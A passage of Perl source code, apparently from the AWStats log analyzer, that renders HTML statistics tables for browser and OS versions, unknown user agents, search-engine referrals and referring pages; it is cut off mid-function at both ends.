colspan=\\\"2\\\"><b>\"\n\t\t\t\t  . uc($family)\n\t\t\t\t  . \"</b></td>\";\n\t\t\t\tprint \"<td>&nbsp;</td><td><b>\"\n\t\t\t\t  . Format_Number(int( $totalfamily_p{$family} ))\n\t\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\t\tprint \"<td><b>\"\n\t\t\t\t  . Format_Number(int( $totalfamily_h{$family} ))\n\t\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$familyheadershown = 1;\n\t\t\t}\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $ver = $1;\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h = \n\t\t\t\t  int( $_browser_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( $_browser_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$family.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t\t  . ucfirst($family) . \" \"\n\t\t\t  . ( $ver ? \"$ver\" : \"?\" ) . \"</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$family}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( $BarWidth * ( $_browser_h{$key} || 0 ) /\n\t\t\t\t\t  $max_h ) + 1;\n\t\t\t}\n\t\t\tif ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {\n\t\t\t\t$bredde_h = 2;\n\t\t\t}\n\t\t\tif ( $max_p > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( $BarWidth * ( $_browser_p{$key} || 0 ) /\n\t\t\t\t\t  $max_p ) + 1;\n\t\t\t}\n\t\t\tif ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {\n\t\t\t\t$bredde_p = 2;\n\t\t\t}\n\t\t\tprint \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\";\n\t\t\tprint \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t\t# alt and title are not provided to reduce page size\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t}\n\t\t\t\tprint \"</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write other records\n\tmy $familyheadershown = 0;\n\tforeach my $key (@keylist) {\n\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\tif ( !$familyheadershown )  {\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h =\n\t\t\t\t  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$Message[2]</b></td>\";\n\t\t\tprint \"<td>&nbsp;</td><td><b>\"\n\t\t\t  . Format_Number(( $total_p - $TotalFamily_p ))\n\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_h - $TotalFamily_h ))\n\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$familyheadershown = 1;\n\t\t}\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $_browser_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $_browser_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td><td width=\\\"80\\\">?</td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t  || \"notavailable\";\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libbrowser</td><td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$key}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_p = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * ( $_browser_h{$key} || 0 ) / $max_h ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_browser_p{$key} || 0 ) / $max_p ) +\n\t\t\t  1;\n\t\t}\n\t\tif ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {\n\t\t\t$bredde_h = 2;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {\n\t\t\t$bredde_p = 2;\n\t\t}\n\t\tprint \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\";\n\t\tprint \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ($ShowBrowsersStats) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown Browser Detail frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowBrowserUnknown{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"unknownbrowser\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[50]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=UNKNOWNREFERERBROWSER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\t&tab_head( \"$title\", 19, 0, 'unknownbrowser' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>User agent (\"\n\t  . ( scalar keys %_unknownrefererbrowser_l )\n\t  . \")</th><th>$Message[9]</th></tr>\\n\";\n\tmy $total_l = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_unknownrefererbrowser_l,\n\t\t\\%_unknownrefererbrowser_l );\n\tforeach my $key (@keylist) {\n\t\tmy $useragent = XMLEncode( CleanXSS($key) );\n\t\tprint\n\t\t  \"<tr><td class=\\\"aws\\\">$useragent</td><td nowrap=\\\"nowrap\\\">\"\n\t\t  . Format_Date( $_unknownrefererbrowser_l{$key}, 1 )\n\t\t  . \"</td></tr>\\n\";\n\t\t$total_l += 1;\n\t\t$count++;\n\t}\n\tmy $rest_l = ( scalar keys %_unknownrefererbrowser_l ) - $total_l;\n\tif ( $rest_l > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>-</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the OS Detail frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowOSDetail{\n\t# Show os versions\n\tprint \"$Center<a name=\\\"osversions\\\">&nbsp;</a><br />\";\n\tmy $title = \"$Message[59]\";\n\t&tab_head( \"$title\", 19, 0, 'osversions' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[58]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t&BuildKeyList( MinimumButNoZero( scalar keys %_os_h, 500 ),\n\t\t1, \\%_os_h, \\%_os_p );\n\tmy %keysinkeylist = ();\n\tmy $max_h = 1;\n\tmy $max_p = 1;\n\n\t# Count total by family\n\tmy %totalfamily_h = ();\n\tmy %totalfamily_p = ();\n\tmy $TotalFamily_h = 0;\n\tmy $TotalFamily_p = 0;\n  OSLOOP: foreach my $key (@keylist) {\n\t\t$total_h += $_os_h{$key};\n\t\t$total_p += $_os_p{$key};\n\t\tif ( $_os_h{$key} > $max_h ) { $max_h = $_os_h{$key}; }\n\t\tif ( $_os_p{$key} > $max_p ) { $max_p = $_os_p{$key}; }\n\t\tforeach my $family ( keys %OSFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$totalfamily_h{$family} += $_os_h{$key};\n\t\t\t\t$totalfamily_p{$family} += $_os_p{$key};\n\t\t\t\t$TotalFamily_h          += $_os_h{$key};\n\t\t\t\t$TotalFamily_p          += $_os_p{$key};\n\t\t\t\tnext OSLOOP;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write records grouped in a browser family\n\tforeach my $family ( keys %OSFamily ) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tmy $familyheadershown = 0;\n\t\tforeach my $key ( reverse sort keys %_os_h ) {\n\t\t\tif ( $key =~ /^$family(.*)/i ) {\n\t\t\t\tif ( !$familyheadershown ) {\n\t\t\t\t\tmy $family_name = '';\n\t\t\t\t\tif ( $OSFamily{$family} ) {\n\t\t\t\t\t\t$family_name = $OSFamily{$family};\n\t\t\t\t\t}\n\t\t\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$family_name</b></td>\";\n\t\t\t\t\tprint \"<td><b>\"\n\t\t\t\t\t  . Format_Number(int( $totalfamily_p{$family} ))\n\t\t\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\t\t\tprint \"<td><b>\"\n\t\t\t\t\t  . Format_Number(int( $totalfamily_h{$family} ))\n\t\t\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t\t$familyheadershown = 1;\n\t\t\t\t}\n\t\t\t\t$keysinkeylist{$key} = 1;\n\t\t\t\tmy $ver = $1;\n\t\t\t\tmy $p_h = '&nbsp;';\n\t\t\t\tmy $p_p = '&nbsp;';\n\t\t\t\tif ($total_h) {\n\t\t\t\t\t$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t\t}\n\t\t\t\tif ($total_p) {\n\t\t\t\t\t$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t\t}\n\t\t\t\tprint \"<tr>\";\n\t\t\t\tprint \"<td\"\n\t\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$key.png\\\"\"\n\t\t\t\t  . AltTitle(\"\")\n\t\t\t\t  . \" /></td>\";\n\n\t\t\t\tprint \"<td class=\\\"aws\\\">$OSHashLib{$key}</td>\";\n\t\t\t\tmy $bredde_h = 0;\n\t\t\t\tmy $bredde_p = 0;\n\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t$bredde_h =\n\t\t\t\t\t  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h )\n\t\t\t\t\t  + 1;\n\t\t\t\t}\n\t\t\t\tif ( ( $bredde_h == 1 ) && $_os_h{$key} ) {\n\t\t\t\t\t$bredde_h = 2;\n\t\t\t\t}\n\t\t\t\tif ( $max_p > 0 ) {\n\t\t\t\t\t$bredde_p =\n\t\t\t\t\t  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p )\n\t\t\t\t\t  + 1;\n\t\t\t\t}\n\t\t\t\tif ( ( $bredde_p == 1 ) && $_os_p{$key} ) {\n\t\t\t\t\t$bredde_p = 2;\n\t\t\t\t}\n\t\t\t\tprint \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td>\";\n\t\t\t\tprint \"<td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td>\";\n\t\t\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t\t\t# alt and title are not provided to reduce page size\n\t\t\t\tif ($ShowOSStats) {\n\t\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t\t\t}\n\t\t\t\tprint \"</td>\";\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\t$count++;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write other records\n\tmy $familyheadershown = 0;\n\tforeach my $key (@keylist) {\n\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\tif ( !$familyheadershown )  {\n\t\t\tmy $p_h = '&nbsp;';\n\t\t\tmy $p_p = '&nbsp;';\n\t\t\tif ($total_h) {\n\t\t\t\t$p_h =\n\t\t\t\t  int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_h = \"$p_h %\";\n\t\t\t}\n\t\t\tif ($total_p) {\n\t\t\t\t$p_p =\n\t\t\t\t  int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /\n\t\t\t\t  10;\n\t\t\t\t$p_p = \"$p_p %\";\n\t\t\t}\n\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" colspan=\\\"2\\\"><b>$Message[2]</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_p - $TotalFamily_p ))\n\t\t\t  . \"</b></td><td><b>$p_p</b></td>\";\n\t\t\tprint \"<td><b>\"\n\t\t\t  . Format_Number(( $total_h - $TotalFamily_h ))\n\t\t\t  . \"</b></td><td><b>$p_h</b></td><td>&nbsp;</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$familyheadershown = 1;\n\t\t}\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $_os_h{$key} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $_os_p{$key} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libos = $OSHashLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $keywithoutcumul;\n\t\t\t$nameicon =~ s/[^\\w]//g;\n\t\t\tprint \"<td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/os\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$libos</td>\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_p = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h =\n\t\t\t  int( $BarWidth * ( $_os_h{$key} || 0 ) / $max_h ) + 1;\n\t\t}\n\t\tif ( ( $bredde_h == 1 ) && $_os_h{$key} ) { $bredde_h = 2; }\n\t\tif ( $max_p > 0 ) {\n\t\t\t$bredde_p =\n\t\t\t  int( $BarWidth * ( $_os_p{$key} || 0 ) / $max_p ) + 1;\n\t\t}\n\t\tif ( ( $bredde_p == 1 ) && $_os_p{$key} ) { $bredde_p = 2; }\n\t\tprint \"<td>\".Format_Number($_os_p{$key}).\"</td><td>$p_p</td>\";\n\t\tprint \"<td>\".Format_Number($_os_h{$key}).\"</td><td>$p_h</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\";\n\n\t\t# alt and title are not provided to reduce page size\n\t\tif ($ShowOSStats) {\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hp'}\\\" width=\\\"$bredde_p\\\" height=\\\"5\\\" /><br />\";\n\t\t\tprint\n\"<img src=\\\"$DirIcons\\/other\\/$BarPng{'hh'}\\\" width=\\\"$bredde_h\\\" height=\\\"5\\\" /><br />\";\n\t\t}\n\t\tprint \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Unknown OS Detail frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowOSUnknown{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"unknownos\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[46]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=UNKNOWNREFERER&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n    &tab_head( \"$title\", 19, 0, 'unknownos' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>User agent (\"\n\t  . ( scalar keys %_unknownreferer_l )\n\t  . \")</th><th>$Message[9]</th></tr>\\n\";\n\tmy $total_l = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_unknownreferer_l,\n\t\t\\%_unknownreferer_l );\n\tforeach my $key (@keylist) {\n\t\tmy $useragent = XMLEncode( CleanXSS($key) );\n\t\tprint \"<tr><td class=\\\"aws\\\">$useragent</td>\";\n\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t  . Format_Date( $_unknownreferer_l{$key}, 1 ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_l += 1;\n\t\t$count++;\n\t}\n\tmy $rest_l = ( scalar keys %_unknownreferer_l ) - $total_l;\n\tif ( $rest_l > 0 ) {\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>-</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referers frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowReferers{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"refererse\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[40]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=SEREFERRALS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n    &tab_head( $title, 19, 0, 'refererse' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\".Format_Number($TotalDifferentSearchEngines).\" $Message[122]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_s = 0;\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList(\n\t\t$MaxRowsInHTMLOutput,\n\t\t$MinHit{'Refer'},\n\t\t\\%_se_referrals_h,\n\t\t(\n\t\t\t( scalar keys %_se_referrals_p )\n\t\t\t? \\%_se_referrals_p\n\t\t\t: \\%_se_referrals_h\n\t\t)\n\t);    # before 5.4 only hits were recorded\n\n\tforeach my $key (@keylist) {\n\t\tmy $newreferer = $SearchEnginesHashLib{$key} || CleanXSS($key);\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalSearchEnginesPages) {\n\t\t\t$p_p =\n\t\t\t  int( $_se_referrals_p{$key} / $TotalSearchEnginesPages *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tif ($TotalSearchEnginesHits) {\n\t\t\t$p_h =\n\t\t\t  int( $_se_referrals_h{$key} / $TotalSearchEnginesHits *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tprint \"<tr><td class=\\\"aws\\\">$newreferer</td>\";\n\t\tprint \"<td>\"\n\t\t  . (\n\t\t\t$_se_referrals_p{$key} ? $_se_referrals_p{$key} : '&nbsp;' )\n\t\t  . \"</td>\";\n\t\tprint \"<td>\"\n\t\t  . ( $_se_referrals_p{$key} ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($_se_referrals_h{$key}).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_p += $_se_referrals_p{$key};\n\t\t$total_h += $_se_referrals_h{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"Total real / shown : $TotalSearchEnginesPages / $total_p - $TotalSearchEnginesHits / $total_h\",\n\t\t\t2\n\t\t);\n\t}\n\t$rest_p = $TotalSearchEnginesPages - $total_p;\n\t$rest_h = $TotalSearchEnginesHits - $total_h;\n\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\tmy $p_p;\n\t\tmy $p_h;\n\t\tif ($TotalSearchEnginesPages) {\n\t\t\t$p_p =\n\t\t\t  int( $rest_p / $TotalSearchEnginesPages * 1000 ) / 10;\n\t\t}\n\t\tif ($TotalSearchEnginesHits) {\n\t\t\t$p_h = int( $rest_h / $TotalSearchEnginesHits * 1000 ) / 10;\n\t\t}\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_p ? Format_Number($rest_p)  : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\" . ( $rest_p ? \"$p_p %\" : '&nbsp;' ) . \"</td>\";\n\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\tprint \"<td>$p_h %</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n\t&html_end(1);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referer Pages frame or static page\n# Parameters:   $NewLinkTarget\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowRefererPages{\n    my $NewLinkTarget = shift;\n\tprint \"$Center<a name=\\\"refererpages\\\">&nbsp;</a><br />\\n\";\n\tmy $total_p = 0;\n\tmy $total_h = 0;\n\tmy $rest_p = 0;\n\tmy $rest_h = 0;\n\n\t# Show filter form\n\t&HTMLShowFormFilter(\n\t\t\"refererpagesfilter\",\n\t\t$FilterIn{'refererpages'},\n\t\t$FilterEx{'refererpages'}\n\t);\n\tmy $title = \"$Message[41]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link \n           $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=PAGEREFS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n    my $cpt   = 0;\n\t$cpt = ( scalar keys %_pagesrefs_h );\n\t&tab_head( \"$title\", 19, 0, 'refererpages' );\n\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>\";\n\tif ( $FilterIn{'refererpages'} || $FilterEx{'refererpages'} ) {\n\n\t\tif ( $FilterIn{'refererpages'} ) {\n\t\t\tprint \"$Message[79] <b>$FilterIn{'refererpages'}</b>\";\n\t\t}\n\t\tif ( $FilterIn{'refererpages'} && $FilterEx{'refererpages'} ) {\n\t\t\tprint \" - \";\n\t\t}\n\t\tif ( $FilterEx{'refererpages'} ) {\n\t\t\tprint\n\t\t\t  \"Exclude $Message[79] 